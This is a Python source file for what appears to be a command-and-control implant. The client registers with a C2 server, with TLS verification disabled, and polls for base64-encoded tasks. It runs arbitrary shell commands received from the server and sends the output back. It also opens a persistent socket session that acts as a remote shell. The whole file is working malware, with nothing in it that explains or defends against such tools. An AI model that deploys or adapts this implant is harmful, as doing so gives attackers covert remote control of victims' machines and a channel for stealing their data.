import requests
import time
import subprocess
import base64
import socket
import struct
from time import sleep

is_base64_enabled = True

host = "https://127.0.0.1:5000"
sessions_host = '127.0.0.1'
sessions_port = 5555
name = ""
delay = 10



def send_msg(sock, msg):
    # Prefix each message with a 4-byte length (network byte order)
    msg = struct.pack('>I', len(msg)) + msg
    sock.sendall(msg)

def recv_msg(sock):
    # Read message length and unpack it into an integer
    raw_msglen = recvall(sock, 4)
    if not raw_msglen:
        return None
    msglen = struct.unpack('>I', raw_msglen)[0]
    # Read the message data
    return recvall(sock, msglen)

def recvall(sock, n):
    # Helper function to recv n bytes or return None if EOF is hit
    data = bytearray()
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data.extend(packet)
    return data

def sessions_shell():
    client_socket = None

    has_socket = False
    # give a few tries to connect in case of errors
    for i in range(5):
        try:

            client_socket = socket.socket()
            client_socket.connect((sessions_host, sessions_port))
            has_socket = True
            break

        except Exception as ex:
            print(f"Failed on socket creation: {ex}")
            # give some time if the server is down
            sleep(5)

    if not has_socket:
        return

    has_pong = False

    for i in range(5):
        try:

            send_msg(client_socket,str.encode(name))            
            has_pong = True
            break

        except Exception as ex:
            print(f"Failed on initial connection pong: {ex}")
            # give some time if the server is down
            sleep(5)
    
    if not has_pong:
        return

    retries_counter = 0
    while True:
        try:
            # hold the connection open for some time
            client_socket.settimeout(360.0)

            print(f"cmd before:")

            cmd_enc = recv_msg(client_socket)

            if not cmd_enc:
                print("lost connection... exiting...!")
                break

            cmd = cmd_enc.decode()
            
            print(f"cmd: {cmd}")
            

            if cmd == "" or cmd == " ":
                print("lost connection... exiting..")
                break

            if cmd == 'c2-sessions quit':
                print("c2-sessions quit")                
                break
            elif cmd == 'c2-sessions ping':
                print("c2-sessions ping")
                send_msg(client_socket,str.encode('c2-sessions pong'))
                
            elif "c2-sessions cmd" in cmd:
                command = " ".join(cmd.split()[2:])
                print(f"command: {command}")

                output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                result = output.stdout + output.stderr
                print("result: ",result)

                send_msg(client_socket, result)
                
        except Exception as ex:
            print(f"Exception in sessions: {ex}")
            if "timed out" in str(ex):
                print(f"timeout waiting server...")
                break
            elif "Transport endpoint is not connected" in str(ex):
                retries_counter += 1
                print(f"Error in sessions: {ex} Retry attempt {retries_counter}")
                
                if retries_counter > 3:
                    return
                
                sleep(3)

            else:
                continue


    if client_socket:
        client_socket.shutdown(2)
        client_socket.close()


def register():    
    # Send a POST request to localhost/register and display the response
    url = f"{host}/register"
    data = {"type": "linux"}
    response = requests.post(url, data=data, verify=False)
    print(f"Server response: {response.text}")
    return response.text

def read_run_task():    
    if name:
        url = f"{host}/tasks/{name}"
    else:
        url = f"{host}/tasks/dummyuuid"
    response = requests.get(url, verify=False)
    decoded_data = response.text
    print(f"Server sent command to execute before: {decoded_data}")
    if is_base64_enabled:
        decoded_data = base64.b64decode(response.text).decode("utf-8")    
    print(f"Server sent command to execute after: {decoded_data}")
    return decoded_data

def post_results(output):    
    print(f'output: {output}')    
    url = f"{host}/results/{name}"    
    encoded_data = output
    if is_base64_enabled:
        encoded_data = base64.b64encode(output.encode("utf-8"))
    data = {"result": encoded_data}
    response = requests.post(url, data=data, verify=False)
    print(f"Server response: {response.text}")

# import urllib3
# urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
requests.packages.urllib3.disable_warnings()
# This while is needed in case the server is down and we reach max retries
while True:
    try:
                
        name = register()
        delay = 10
        
        while True:      
            
            time.sleep(delay)

            rsp = read_run_task()            

            if not rsp:
                continue

            cmd = rsp.split()

            if cmd[0] == "c2-quit": 
                print("c2-quit... exiting...")               
                exit(1)

            elif cmd[0] == "c2-sleep": 
                delay = int(cmd[1])
                print(f"c2-sleep set to {delay}")  
                post_results(f"sleep set to {delay}")                             
                
            elif cmd[0] == "c2-register":
                name = register()                
                
            elif cmd[0] == "c2-shell":
                command = ' '.join(cmd[1:])
                result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)                
                #result.wait()
                output = result.stdout.decode("utf-8")                
                post_results(output)           
            elif cmd[0] == "c2-session":
                try:
                    server_port = int(' '.join(cmd[1:]))
                except Exception as ex:
                    print("Not a valid number")
                sessions_shell()
                #post_results(output)        
            
    except Exception as ex:
        print(f"Failed ex : {ex}")
        